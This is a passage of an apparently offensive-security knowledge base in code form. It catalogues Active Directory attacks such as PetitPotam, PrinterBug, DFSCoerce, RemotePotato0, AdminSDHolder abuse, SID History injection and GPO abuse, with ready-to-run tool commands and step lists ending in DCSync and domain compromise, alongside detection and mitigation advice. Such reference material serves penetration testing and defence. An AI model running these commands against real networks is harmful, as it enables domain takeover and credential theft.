        name: "Certipy (shadow)",
        command: "certipy shadow auto -u attacker@domain.local -p password -account targetuser -dc-ip 10.0.0.1",
        description: "Adds shadow credentials, authenticates, and retrieves the NTLM hash from Linux"
      },
      {
        name: "Rubeus (PKINIT with shadow cred)",
        command: "Rubeus.exe asktgt /user:targetuser /certificate:BASE64_CERT /password:CERT_PASSWORD /domain:domain.local /dc:dc01.domain.local /getcredentials /show /ptt",
        description: "Authenticates using the shadow credential certificate and extracts the NTLM hash"
      },
      {
        name: "pywhisker",
        command: "python3 pywhisker.py -d domain.local -u attacker -p password --target targetuser --action add --dc-ip 10.0.0.1",
        description: "Adds shadow credentials from Linux using pywhisker"
      }
    ],
    steps: [
      "Step 1: Identify targets where you have write access to msDS-KeyCredentialLink. Use BloodHound to find GenericAll, GenericWrite, or specific write edges to user/computer objects.",
      "Step 2: Add a shadow credential using Whisker (Windows) or pywhisker/certipy (Linux). Whisker outputs the exact Rubeus command needed for authentication.",
      "Step 3: Authenticate using the shadow credential certificate via PKINIT. Rubeus asktgt with the /certificate parameter and /getcredentials to also retrieve the NTLM hash.",
      "Step 4: The PKINIT authentication returns a TGT for the target account. With /getcredentials, Rubeus also uses the U2U trick to recover the account's NTLM hash.",
      "Step 5: Use the TGT or NTLM hash for further attacks. If the target is a computer account, use it for RBCD, Silver Ticket, or lateral movement.",
      "Step 6: The shadow credential persists on the target object, providing long-term access without modifying the account's password.",
      "Step 7: For cleanup, use Whisker list to find the deviceID, then Whisker remove to delete the shadow credential."
    ],
    detection: "Monitor for modifications to the msDS-KeyCredentialLink attribute via Event ID 5136 (Directory Service Object Modification). Alert on key credential additions to privileged accounts or sensitive computer accounts (domain controllers). Track PKINIT authentication (Event ID 4768 with pre-auth type 16) for accounts that do not normally use certificate-based authentication. Monitor for Whisker and pywhisker tool execution. Implement a baseline of which accounts have key credentials and alert on changes.",
    mitigation: "Restrict write access to msDS-KeyCredentialLink on sensitive accounts. Audit current key credentials on privileged accounts: Get-ADUser Administrator -Properties msDS-KeyCredentialLink. Implement a process for managing key credentials and remove unauthorized entries. Monitor the attribute for changes. Use the Protected Users group where applicable (though this does not prevent key credential modifications, it may affect PKINIT behavior). Ensure domain functional level security features are properly configured.",
    references: [
      "https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab",
      "https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials",
      "https://github.com/eladshamir/Whisker"
    ]
  },
  // -------------------------------------------------------------------------
  // Coercion Attacks
  // -------------------------------------------------------------------------
  {
    id: "AD-038",
    name: "PetitPotam (EfsRpcOpenFileRaw)",
    category: "lateral_movement",
    description: "PetitPotam is an authentication coercion attack that abuses the Microsoft Encrypting File System Remote Protocol (MS-EFSRPC) to force a target machine to authenticate to an attacker-controlled server. The attack uses the EfsRpcOpenFileRaw function (and related EFS RPC functions) to trigger the target's machine account to send an NTLM authentication request to a specified UNC path. When combined with an NTLM relay attack (particularly to AD CS HTTP endpoints as in ESC8, or to LDAP for RBCD/ACL abuse), PetitPotam enables domain compromise from an unauthenticated position. The original version by Gilles Lionel (topotam) could be triggered without any authentication (unauthenticated coercion) on unpatched systems. Microsoft patched the unauthenticated vector in August 2021 (CVE-2021-36942) but the authenticated version remains functional by design. PetitPotam became one of the most popular coercion tools in the AD attack arsenal due to its simplicity and effectiveness, especially when chained with AD CS relay attacks.",
    prerequisites: [
      "Network access to the target machine on RPC ports (TCP 135 + dynamic range)",
      "For unauthenticated version: unpatched target (pre-August 2021)",
      "For authenticated version: any domain user credentials",
      "A relay infrastructure or listener to capture the coerced authentication"
    ],
    difficulty: "beginner",
    tools: [
      {
        name: "PetitPotam (unauthenticated)",
        command: "python3 PetitPotam.py listener_ip target_ip",
        description: "Triggers EFS-based authentication coercion without credentials (requires unpatched target)"
      },
      {
        name: "PetitPotam (authenticated)",
        command: "python3 PetitPotam.py -u user -p password -d domain.local listener_ip target_ip",
        description: "Triggers authentication coercion with valid domain credentials"
      },
      {
        name: "Coercer",
        command: "python3 Coercer.py coerce -u user -p password -d domain.local -l listener_ip -t target_ip --always-continue",
        description: "Attempts multiple coercion methods including PetitPotam variants"
      },
      {
        name: "Impacket ntlmrelayx",
        command: "python3 ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController",
        description: "Relay setup to capture and relay the coerced authentication to AD CS"
      }
    ],
    steps: [
      "Step 1: Set up the relay or capture infrastructure. For AD CS relay: ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp --adcs. For LDAP relay: ntlmrelayx.py -t ldap://dc01 --escalate-user attacker.",
      "Step 2: Trigger the PetitPotam coercion against the target (ideally a domain controller): python3 PetitPotam.py listener_ip dc01.domain.local.",
      "Step 3: The target DC's machine account authenticates via NTLM to your listener. ntlmrelayx relays this to the configured target.",
      "Step 4: If relaying to AD CS: a certificate is issued for the DC machine account. Use certipy auth -pfx dc01.pfx to authenticate and get the DC hash.",
      "Step 5: If relaying to LDAP: ntlmrelayx grants DCSync rights or configures RBCD for the attacker.",
      "Step 6: Use the obtained access (certificate, DCSync rights, or RBCD) for full domain compromise.",
      "Step 7: Perform DCSync to extract all domain credentials: secretsdump.py domain.local/DC01$@dc01 -hashes :DC_HASH."
    ],
    detection: "Monitor for MS-EFSRPC function calls, particularly EfsRpcOpenFileRaw, EfsRpcEncryptFileSrv, and EfsRpcDecryptFileSrv from unexpected sources. Event ID 5145 (network share access) for the EFSRPC named pipe. Network monitoring for NTLM authentication from domain controllers to non-DC hosts. Track PetitPotam-specific network patterns. Microsoft Defender for Identity detects PetitPotam coercion attempts.",
    mitigation: "Apply the August 2021 security update (KB5005413) to patch unauthenticated PetitPotam. Disable the EFS service on domain controllers where not needed. Enable Extended Protection for Authentication on AD CS web enrollment. Enforce SMB signing and LDAP signing. Block outbound NTLM authentication from domain controllers via Group Policy: Network security: Restrict NTLM: Outgoing NTLM traffic to remote servers = Deny all. Implement network segmentation to prevent DC-to-attacker communication.",
    references: [
      "https://github.com/topotam/PetitPotam",
      "https://attack.mitre.org/techniques/T1187/",
      "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942"
    ]
  },
  {
    id: "AD-039",
    name: "PrinterBug / SpoolSample (MS-RPRN)",
    category: "lateral_movement",
    description: "The PrinterBug (also known as SpoolSample) exploits the MS-RPRN (Print System Remote Protocol) to force a target machine running the Print Spooler service to authenticate to an attacker-controlled server. The attack uses the RpcRemoteFindFirstPrinterChangeNotificationEx function, which allows any authenticated domain user to request that a print server send a change notification to a specified host. When this notification is triggered, the target machine's computer account authenticates via NTLM (or Kerberos in some cases) to the attacker's listener. This technique was discovered by Lee Christensen and is commonly used in combination with unconstrained delegation abuse: the attacker compromises a server with unconstrained delegation, triggers the PrinterBug against a domain controller, and captures the DC's TGT when it authenticates. The Print Spooler service runs by default on all Windows systems, including domain controllers, making this a highly reliable coercion technique. Unlike PetitPotam, the PrinterBug always requires valid domain credentials.",
    prerequisites: [
      "Valid domain user credentials (any authenticated user)",
      "Print Spooler service running on the target (default on most Windows systems)",
      "Network access to the target on RPC ports"
    ],
    difficulty: "beginner",
    tools: [
      {
        name: "SpoolSample",
        command: "SpoolSample.exe dc01.domain.local listener.domain.local",
        description: "Triggers the PrinterBug to force DC authentication to the listener"
      },
      {
        name: "Dementor.py",
        command: "python3 dementor.py -d domain.local -u user -p password listener_ip dc01.domain.local",
        description: "Python implementation of the PrinterBug for Linux attack hosts"
      },
      {
        name: "printerbug.py (Impacket)",
        command: "python3 printerbug.py domain.local/user:password@dc01.domain.local listener_ip",
        description: "Impacket-based PrinterBug trigger"
      },
      {
        name: "Rubeus (monitor)",
        command: "Rubeus.exe monitor /interval:5 /filteruser:DC01$ /nowrap",
        description: "Captures the TGT when used with unconstrained delegation"
      }
    ],
    steps: [
      "Step 1: Verify the Print Spooler service is running on the target: ls \\\\target\\pipe\\spoolss (from Windows) or rpcdump.py target | grep MS-RPRN (from Linux).",
      "Step 2: Set up the capture mechanism. For unconstrained delegation abuse: run Rubeus monitor on the compromised delegation server. For NTLM relay: start ntlmrelayx.py.",
      "Step 3: Trigger the PrinterBug: SpoolSample.exe dc01.domain.local listener.domain.local. From Linux: python3 printerbug.py domain.local/user:password@dc01 listener_ip.",
      "Step 4: The DC's machine account authenticates to your listener. With unconstrained delegation, the TGT is captured by Rubeus. With NTLM relay, the authentication is forwarded to the target.",
      "Step 5: For unconstrained delegation: inject the captured TGT with Rubeus ptt and perform DCSync.",
      "Step 6: For NTLM relay: use the relayed authentication for certificate enrollment, LDAP modifications, or SMB access."
    ],
    detection: "Monitor for RPC calls to the spoolss named pipe from unexpected sources (Event ID 5145). Track Print Spooler service activity on domain controllers. Alert on NTLM authentication from DCs to non-DC hosts. Monitor for Rubeus execution on servers with unconstrained delegation. Microsoft Defender for Identity detects PrinterBug exploitation patterns.",
    mitigation: "Disable the Print Spooler service on domain controllers and all servers where printing is not required: Stop-Service Spooler; Set-Service Spooler -StartupType Disabled. If the Spooler must run, restrict which hosts can connect to it via firewall rules. Remove unconstrained delegation from servers (use constrained delegation or RBCD instead). Add privileged accounts to the Protected Users group. Block outbound NTLM from domain controllers.",
    references: [
      "https://github.com/leechristensen/SpoolSample",
      "https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation"
    ]
  },
  {
    id: "AD-040",
    name: "DFSCoerce",
    category: "lateral_movement",
    description: "DFSCoerce is an authentication coercion attack that abuses the Microsoft Distributed File System (DFS) protocol via the NetrDfsRemoveStdRoot and NetrDfsAddStdRoot RPC functions in the MS-DFSNM (DFS Namespace Management Protocol). When these functions are called against a target, the target machine account authenticates via NTLM to the attacker-specified server. DFSCoerce was discovered by Filip Dragovic as an alternative to PetitPotam when the EFS-based coercion was patched. The attack is particularly effective because the DFS Namespace service is commonly running on domain controllers and file servers. Like other coercion techniques, DFSCoerce is most powerful when combined with NTLM relay attacks targeting AD CS, LDAP, or other services. The authenticated version requires any domain user credentials, and the coercion triggers the target's machine account to authenticate outbound.",
    prerequisites: [
      "Valid domain user credentials",
      "DFS Namespace service running on the target",
      "Network access to the target on RPC ports"
    ],
    difficulty: "beginner",
    tools: [
      {
        name: "DFSCoerce",
        command: "python3 dfscoerce.py -u user -p password -d domain.local listener_ip dc01.domain.local",
        description: "Triggers DFS-based authentication coercion against the target"
      },
      {
        name: "Coercer (DFS)",
        command: "python3 Coercer.py coerce -u user -p password -d domain.local -l listener_ip -t dc01.domain.local --filter-protocol-name MS-DFSNM",
        description: "Attempts DFS coercion specifically using the Coercer framework"
      }
    ],
    steps: [
      "Step 1: Set up the relay infrastructure: ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp --adcs --template DomainController.",
      "Step 2: Trigger DFSCoerce against the target DC: python3 dfscoerce.py -u user -p password -d domain.local listener_ip dc01.domain.local.",
      "Step 3: The DC authenticates to your listener via NTLM. ntlmrelayx relays to the AD CS endpoint.",
      "Step 4: A certificate is issued for the DC machine account. Use it for PKINIT authentication.",
      "Step 5: Extract the DC hash via certificate authentication and perform DCSync.",
      "Step 6: If DFS coercion fails, try other coercion methods (PetitPotam, PrinterBug, ShadowCoerce)."
    ],
    detection: "Monitor for RPC calls to the DFS Namespace Management interface from unexpected sources. Track Event ID 5145 for access to the netdfs named pipe. Alert on NTLM authentication from domain controllers to non-DC hosts. Network monitoring for DFS-related RPC traffic patterns.",
    mitigation: "Disable the DFS Namespace service on domain controllers where DFS is not required. Block outbound NTLM authentication from domain controllers. Enforce SMB signing. Remove unnecessary RPC exposure through firewall rules. Apply network segmentation to limit which hosts can reach DC RPC ports.",
    references: [
      "https://github.com/Wh04m1001/DFSCoerce",
      "https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-dfsnm"
    ]
  },
  {
    id: "AD-041",
    name: "ShadowCoerce",
    category: "lateral_movement",
    description: "ShadowCoerce is an authentication coercion technique that abuses the Microsoft File Server VSS Agent Service (MS-FSRVP - File Server Remote VSS Protocol). The attack triggers the target machine to authenticate to an attacker-controlled server by calling RPC functions related to shadow copy management on the target's file server. The FSRVP service is commonly running on file servers and domain controllers that have the File Server VSS Agent Service role installed. ShadowCoerce was discovered as yet another coercion vector when organizations began patching or disabling EFS (PetitPotam) and Print Spooler (PrinterBug) services. The attack follows the same pattern as other coercion techniques: the attacker triggers an outbound NTLM authentication from the target, then relays it to a valuable service like AD CS or LDAP.",
    prerequisites: [
      "Valid domain user credentials",
      "File Server VSS Agent Service running on the target",
      "Network access to target RPC ports"
    ],
    difficulty: "beginner",
    tools: [
      {
        name: "ShadowCoerce",
        command: "python3 shadowcoerce.py -u user -p password -d domain.local listener_ip target_ip",
        description: "Triggers VSS-based authentication coercion against the target"
      },
      {
        name: "Coercer",
        command: "python3 Coercer.py coerce -u user -p password -d domain.local -l listener_ip -t target_ip --filter-protocol-name MS-FSRVP",
        description: "Attempts FSRVP coercion using the Coercer framework"
      }
    ],
    steps: [
      "Step 1: Check if the File Server VSS Agent Service is running on the target: rpcdump.py target | grep MS-FSRVP.",
      "Step 2: Set up NTLM relay infrastructure targeting AD CS or LDAP.",
      "Step 3: Trigger ShadowCoerce: python3 shadowcoerce.py -u user -p password listener_ip target_ip.",
      "Step 4: The target authenticates to your listener. Relay the authentication for certificate enrollment or LDAP modification.",
      "Step 5: Use obtained certificates or access for further domain compromise.",
      "Step 6: If ShadowCoerce fails, the service may not be installed -- try other coercion methods."
    ],
    detection: "Monitor for RPC calls to the FSRVP interface from unexpected sources. Track named pipe access to FssagentRpc. Alert on NTLM authentication from servers to unexpected destinations. Network monitoring for FSRVP RPC traffic patterns.",
    mitigation: "Disable the File Server VSS Agent Service where not needed. Block outbound NTLM from sensitive servers. Enforce SMB signing. Implement network segmentation. Apply firewall rules to restrict RPC access.",
    references: [
      "https://github.com/ShutdownRepo/ShadowCoerce",
      "https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-fsrvp"
    ]
  },
  {
    id: "AD-042",
    name: "RemotePotato0",
    category: "privilege_escalation",
    description: "RemotePotato0 is a privilege escalation attack that allows an attacker with a low-privileged shell on a machine where a privileged user is logged in to capture the privileged user's NTLM authentication and relay it to a target of their choice. Unlike other potato exploits that escalate local service accounts to SYSTEM, RemotePotato0 specifically targets the NTLM credentials of other users logged into the same system. The attack works by abusing DCOM activation service and the ability to manipulate HTTP request headers to trigger cross-session NTLM authentication. When a privileged user (such as a Domain Admin) has an interactive session on a server, RemotePotato0 can capture their NTLM authentication and relay it to another machine for DCSync, AD CS enrollment, or SMB access. The technique was developed by Antonio Cocomazzi and Andrea Pierini as an evolution of previous Potato exploits, focusing on cross-session credential capture rather than SYSTEM escalation.",
    prerequisites: [
      "Low-privileged shell on a system where a privileged user has an active session",
      "The privileged user must have an interactive session (console or RDP)",
      "NTLM relay target (AD CS, LDAP, or SMB with signing disabled)"
    ],
    difficulty: "advanced",
    tools: [
      {
        name: "RemotePotato0",
        command: "RemotePotato0.exe -m 2 -x 10.0.0.50 -p 9999 -s 1",
        description: "Captures NTLM authentication from session 1 and sends to the relay at 10.0.0.50:9999"
      },
      {
        name: "Impacket ntlmrelayx",
        command: "python3 ntlmrelayx.py -t ldap://dc01.domain.local --escalate-user lowprivuser --no-wcf-server",
        description: "Relays the captured NTLM authentication to LDAP for privilege escalation"
      },
      {
        name: "socat (redirect)",
        command: "socat TCP-LISTEN:135,fork,reuseaddr TCP:target.domain.local:9999",
        description: "Redirects DCOM activation traffic for RemotePotato0"
      }
    ],
    steps: [
      "Step 1: Identify systems where a privileged user has an active session using BloodHound sessions, quser, or Get-NetLoggedon.",
      "Step 2: Gain a low-privileged shell on the target system (even a non-admin shell works).",
      "Step 3: Set up the NTLM relay on your attack host: ntlmrelayx.py -t ldap://dc01 --escalate-user yourlowprivuser.",
      "Step 4: Run RemotePotato0 on the target: RemotePotato0.exe -m 2 -x attacker_ip -p 9999 -s SESSION_ID.",
      "Step 5: RemotePotato0 captures the privileged user's NTLM authentication and forwards it to your relay.",
      "Step 6: ntlmrelayx relays the authentication to LDAP and grants DCSync rights to your account.",
      "Step 7: Perform DCSync with the escalated privileges to extract all domain credentials."
    ],
    detection: "Monitor for unusual DCOM activation patterns and HTTP requests between sessions. Track NTLM authentication originating from unusual processes. Alert on DCSync rights being granted to non-admin accounts. Monitor for RemotePotato0 binary execution. Event ID 4624 showing authentication from unexpected processes.",
    mitigation: "Minimize privileged user sessions on member servers. Use Remote Credential Guard for RDP sessions. Implement session isolation. Enforce LDAP signing to prevent LDAP relay. Block outbound NTLM from servers. Use Privileged Access Workstations (PAWs) for admin activities.",
    references: [
      "https://github.com/antonioCoco/RemotePotato0",
      "https://jlajara.gitlab.io/Potatoes_Windows_Privesc"
    ]
  },
  // -------------------------------------------------------------------------
  // ACL/Permission Abuse
  // -------------------------------------------------------------------------
  {
    id: "AD-043",
    name: "AdminSDHolder Abuse",
    category: "persistence",
    description: "AdminSDHolder is a container object in Active Directory (CN=AdminSDHolder,CN=System,DC=domain,DC=local) whose ACL is propagated to all protected groups and their members every 60 minutes by the SDProp (Security Descriptor Propagator) process. Protected groups include Domain Admins, Enterprise Admins, Schema Admins, Administrators, Account Operators, Server Operators, Print Operators, Backup Operators, and others. An attacker with write access to the AdminSDHolder object can modify its ACL to grant themselves permissions (such as GenericAll or WriteDACL), and within 60 minutes, those permissions will be automatically propagated to all protected accounts in the domain. This provides a powerful persistence mechanism because even if an administrator removes the attacker's permissions from individual protected accounts, SDProp will re-apply them from the AdminSDHolder template on the next propagation cycle. The AdminSDHolder mechanism is designed to protect privileged accounts by ensuring their ACLs remain consistent, but attackers can subvert it for persistence.",
    prerequisites: [
      "Write access (WriteDACL, GenericAll) on the AdminSDHolder object",
      "Domain Admin or equivalent to initially modify AdminSDHolder",
      "SDProp must be running (it runs every 60 minutes by default)"
    ],
    difficulty: "advanced",
    tools: [
      {
        name: "PowerView (add ACE)",
        command: "Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=domain,DC=local' -PrincipalIdentity backdooruser -Rights All -Verbose",
        description: "Adds GenericAll rights for the backdoor user to AdminSDHolder"
      },
      {
        name: "PowerView (verify)",
        command: "Get-DomainObjectAcl -Identity 'CN=AdminSDHolder,CN=System,DC=domain,DC=local' -ResolveGUIDs | Where-Object {$_.SecurityIdentifier -match 'BACKDOOR_USER_SID'}",
        description: "Verifies the ACE was added to AdminSDHolder"
      },
      {
        name: "PowerView (force SDProp)",
        command: "Invoke-SDPropagator -ShowProgress -TimeoutMinutes 1",
        description: "Forces immediate SDProp propagation instead of waiting 60 minutes"
      },
      {
        name: "AD Module",
        command: "Set-ADACL -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=domain,DC=local' -Principal backdooruser -AccessRight GenericAll -AccessControlType Allow",
        description: "Alternative method to add ACL using the AD module"
      }
    ],
    steps: [
      "Step 1: Identify the AdminSDHolder object: CN=AdminSDHolder,CN=System,DC=domain,DC=local.",
      "Step 2: Add a permissions entry granting your backdoor account GenericAll (or more targeted rights like WriteDACL, ResetPassword) on AdminSDHolder using PowerView Add-DomainObjectAcl.",
      "Step 3: Wait for SDProp to run (every 60 minutes by default) or force it manually. SDProp copies the AdminSDHolder ACL to all protected group members.",
      "Step 4: After propagation, your backdoor account has the specified permissions on ALL protected accounts in the domain, including Domain Admins and Enterprise Admins.",
      "Step 5: Use the propagated permissions for privilege escalation: reset Domain Admin passwords (ForceChangePassword), add yourself to Domain Admins (AddMember via GenericAll), or grant DCSync rights (WriteDACL).",
      "Step 6: This persists even if admins manually remove your permissions from individual accounts -- SDProp will re-apply them on the next cycle.",
      "Step 7: To trigger SDProp immediately, modify the runProtectAdminGroupsTask attribute on the domain root or use Invoke-SDPropagator."
    ],
    detection: "Monitor for ACL modifications on the AdminSDHolder object via Event ID 5136 (Directory Service Changes). Alert on any new ACE being added to AdminSDHolder, especially those granting broad rights (GenericAll, WriteDACL, WriteOwner) to non-standard accounts. Compare AdminSDHolder ACL against a known-good baseline. Monitor for manual SDProp triggers. Track the AdminCount attribute on user accounts -- newly protected accounts may indicate AdminSDHolder abuse. Microsoft Defender for Identity can detect AdminSDHolder modifications.",
    mitigation: "Restrict write access to the AdminSDHolder object to only Domain Admins and the default administrative accounts. Implement a change management process for AdminSDHolder modifications. Regularly audit the AdminSDHolder ACL and compare against a known baseline. Deploy monitoring for AdminSDHolder changes with immediate alerting. Consider implementing a process to periodically verify AdminSDHolder integrity. Restrict the number of accounts with Domain Admin privileges.",
    references: [
      "https://attack.mitre.org/techniques/T1078/002/",
      "https://adsecurity.org/?p=1906",
      "https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/intalling-skeleton-key-with-mimikatz"
    ]
  },
  {
    id: "AD-044",
    name: "SID History Injection",
    category: "persistence",
    description: "SID History injection involves adding a Security Identifier (SID) to the sIDHistory attribute of an Active Directory object. The sIDHistory attribute was designed for domain migrations, allowing users moved from one domain to another to retain access to resources in their old domain by preserving their old SIDs. When an authentication token is created for a user, all SIDs in their sIDHistory are added to the token alongside their current SID and group SIDs, granting them all the permissions associated with those historical SIDs. An attacker can inject arbitrary SIDs into a user's sIDHistory, effectively granting them the permissions of any account or group in the domain (or trusting domains) without modifying group memberships. Injecting the Domain Admins SID (S-1-5-21-DOMAIN-512) grants Domain Admin privileges. SID History injection is particularly stealthy because the user does not appear as a member of the privileged group in standard group membership queries -- the elevated access is hidden in the token. The injection requires Domain Admin privileges and is performed via Mimikatz or DCShadow.",
    prerequisites: [
      "Domain Admin or SYSTEM access on a domain controller",
      "For Mimikatz: ability to patch NTDS service or run DCShadow",
      "Target user account to inject SID History into"
    ],
    difficulty: "advanced",
    tools: [
      {
        name: "Mimikatz (SID History)",
        command: "mimikatz.exe \"privilege::debug\" \"sid::patch\" \"sid::add /sam:targetuser /new:S-1-5-21-DOMAIN-SID-512\"",
        description: "Patches NTDS to inject the Domain Admins SID into the target user's SID History"
      },
      {
        name: "Mimikatz (DCShadow SIDHistory)",
        command: "mimikatz.exe \"lsadump::dcshadow /object:targetuser /attribute:sIDHistory /value:S-1-5-21-DOMAIN-SID-512\"",
        description: "Uses DCShadow to inject SID History via replication (more stealthy)"
      },
      {
        name: "PowerView (check)",
        command: "Get-DomainUser targetuser -Properties sIDHistory, objectSid | Select-Object samaccountname, sIDHistory, objectSid",
        description: "Checks the SID History attribute of a user account"
      }
    ],
    steps: [
      "Step 1: Identify the SID you want to inject. For Domain Admin access: S-1-5-21-DOMAIN-SID-512. For Enterprise Admin: S-1-5-21-ROOT-DOMAIN-SID-519.",
      "Step 2: Choose the injection method. Mimikatz sid::add requires patching the NTDS service on a DC (noisier). DCShadow uses replication to inject the attribute (stealthier).",
      "Step 3: For Mimikatz direct injection: run privilege::debug, sid::patch (patches NTDS to allow SID History modification), then sid::add /sam:targetuser /new:TARGET_SID.",
      "Step 4: For DCShadow injection: run lsadump::dcshadow /object:targetuser /attribute:sIDHistory /value:TARGET_SID in the SYSTEM session, then lsadump::dcshadow /push in the DA session.",
      "Step 5: Verify the injection: Get-ADUser targetuser -Properties sIDHistory | Select-Object SIDHistory. The injected SID should appear.",
      "Step 6: The target user now has Domain Admin (or other) privileges embedded in their authentication token without being a visible member of the group.",
      "Step 7: Use the account for privileged operations. Group membership queries (net group 'Domain Admins') will NOT show this user as a member, providing operational stealth."
    ],
    detection: "Monitor for changes to the sIDHistory attribute via Event ID 4765 (SID History was added to an account) and Event ID 5136 (Directory Service Changes). Alert on any sIDHistory modifications outside of documented domain migration activities. Regularly audit accounts with non-empty sIDHistory: Get-ADUser -Filter {sIDHistory -like '*'} -Properties sIDHistory. Compare sIDHistory SIDs against known legitimate migration SIDs. Monitor for DCShadow indicators (temporary DC registration). Microsoft Defender for Identity can detect SID History injection.",
    mitigation: "Enable SID Filtering on all trust relationships to prevent cross-domain SID History abuse. Regularly audit accounts for unauthorized sIDHistory values. Implement monitoring and alerting on Event ID 4765. Restrict Domain Admin access to minimize who can perform SID History injection. Use DCShadow detection mechanisms to identify replication-based injection. Remove sIDHistory values after domain migrations are complete.",
    references: [
      "https://attack.mitre.org/techniques/T1134/005/",
      "https://adsecurity.org/?p=1772",
      "https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/intalling-skeleton-key-with-mimikatz"
    ]
  },
  {
    id: "AD-045",
    name: "GPO Abuse",
    category: "privilege_escalation",
    description: "Group Policy Object (GPO) abuse involves creating or modifying Group Policy Objects to execute arbitrary code, modify security settings, or deploy persistence mechanisms across domain-joined systems. GPOs are linked to sites, domains, or organizational units (OUs), and they apply configurations to all computers and users within their scope. An attacker with write access to an existing GPO (or the ability to create and link new GPOs) can leverage this for code execution on all systems where the GPO is applied. Common GPO abuse techniques include: adding immediate scheduled tasks (which execute as SYSTEM), modifying user rights assignments, deploying startup/logon scripts, configuring software installation, modifying registry settings, and creating local users or group memberships. The most impactful abuse targets GPOs linked to the domain root or to OUs containing domain controllers, as this provides code execution on all domain-joined systems or DCs respectively.",
    prerequisites: [
      "Write access to a GPO (GPC object in AD and GPT files in SYSVOL) or ability to create/link GPOs",
      "The GPO must be linked to an OU/domain/site containing target computers",
      "Group Policy processing must be functioning on target systems"
    ],
    difficulty: "intermediate",
    tools: [
      {
        name: "SharpGPOAbuse",
        command: "SharpGPOAbuse.exe --AddComputerTask --TaskName 'Backdoor' --Author DOMAIN\\Administrator --Command 'cmd.exe' --Arguments '/c net localgroup administrators backdooruser /add' --GPOName 'Default Domain Policy'",
        description: "Adds an immediate scheduled task to a GPO for code execution on all affected systems"
      },
      {
        name: "SharpGPOAbuse (user rights)",
        command: "SharpGPOAbuse.exe --AddUserRightsAssignment --UserRightsAssignment 'SeTakeOwnershipPrivilege' --UserAccount backdooruser --GPOName 'Target GPO'",
        description: "Adds a user rights assignment through a GPO"
      },
      {
        name: "PowerView (enumerate GPOs)",
        command: "Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteProperty|WriteDacl'}",
        description: "Finds GPOs with write permissions for potential abuse"
      },
      {
        name: "BloodHound",
        command: "MATCH (g:GPO) MATCH (u:User {name:'ATTACKER@DOMAIN.LOCAL'}) MATCH p=shortestPath((u)-[*1..]->(g)) RETURN p",
        description: "BloodHound query to find GPOs the attacker can modify"
      },
      {
        name: "pyGPOAbuse",
        command: "python3 pygpoabuse.py domain.local/user:password -gpo-id 'GPO_GUID' -command 'net localgroup administrators backdooruser /add' -taskname 'Backdoor' -dc-ip 10.0.0.1",
        description: "Python implementation for GPO abuse from Linux"
      }
    ],
    steps: [
      "Step 1: Enumerate GPOs and their permissions using PowerView or BloodHound. Identify GPOs where you have write access (GenericAll, GenericWrite, WriteProperty, or WriteDACL).",
      "Step 2: Determine which OUs and computers are affected by the writable GPO: Get-DomainOU -GPLink 'GPO_GUID' | Get-DomainComputer to see the scope of impact.",
      "Step 3: Choose an abuse technique. Immediate scheduled tasks are the most reliable for code execution. User rights assignments are useful for privilege escalation. Startup scripts provide persistence.",
      "Step 4: Add the malicious configuration using SharpGPOAbuse (Windows) or pyGPOAbuse (Linux). For a scheduled task: SharpGPOAbuse.exe --AddComputerTask --TaskName 'Update' --Command 'cmd.exe' --Arguments '/c PAYLOAD' --GPOName 'Target GPO'.",
      "Step 5: Wait for Group Policy to refresh (default 90 minutes +/- 30 minutes random offset) or force an immediate update: gpupdate /force on target systems.",
      "Step 6: The payload executes as SYSTEM on all affected computers when Group Policy processes the scheduled task.",
      "Step 7: For persistence, deploy a scheduled task that runs periodically. For immediate impact, use an Immediate Scheduled Task that runs once and then can be cleaned up.",
      "Step 8: Clean up: remove the malicious GPO settings after exploitation to minimize detection."
    ],
    detection: "Monitor for GPO modifications via Event ID 5136 (Directory Service Changes) on the GPC object and Event ID 4662 for GPT SYSVOL file modifications. Track changes to ScheduledTasks.xml, Scripts.ini, and other GPO configuration files in SYSVOL. Alert on new immediate scheduled tasks in GPOs. Event ID 4698 (Scheduled Task Created) on affected endpoints shows GPO-deployed tasks. Monitor Group Policy processing events (Event IDs 4004, 4006 in the Group Policy operational log). Compare GPO configurations against baselines.",
    mitigation: "Restrict GPO creation and modification rights to dedicated Group Policy administrators. Audit GPO permissions regularly using Get-GPPermission. Implement change management for GPO modifications. Enable advanced auditing on SYSVOL and GPO-related AD objects. Block GPO abuse tools (SharpGPOAbuse, pyGPOAbuse) via application whitelisting. Regularly review GPO settings for unauthorized changes. Implement SYSVOL change monitoring.",
    references: [
      "https://attack.mitre.org/techniques/T1484/001/",
      "https://github.com/FSecureLABS/SharpGPOAbuse",
      "https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-gpos"
    ]
  },
  {
    id: "AD-046",
    name: "WriteDACL Abuse",
    category: "privilege_escalation",
    description: "WriteDACL abuse exploits the ability to modify the Discretionary Access Control List (DACL) on an Active Directory object. The DACL defines who has what permissions on the object. If an attacker has WriteDACL rights on an object (user, group, computer, OU, or the domain itself), they can grant themselves any permissions on that object. On a user object, this could mean granting ResetPassword to change the user's password, or GenericAll for full control. On the domain object, WriteDACL can be used to grant DS-Replication-Get-Changes and DS-Replication-Get-Changes-All (DCSync rights). WriteDACL is particularly dangerous on the domain root object because it enables DCSync without needing existing Domain Admin access. The abuse is a two-step process: first, modify the DACL to add the desired permissions, then exercise those permissions for the actual attack. WriteDACL rights can be found through BloodHound analysis or manual ACL enumeration.",
    prerequisites: [
      "WriteDACL permission on the target AD object",
      "Network access to a domain controller (LDAP/RPC)"
    ],
    difficulty: "intermediate",
    tools: [
      {
        name: "PowerView (grant DCSync)",
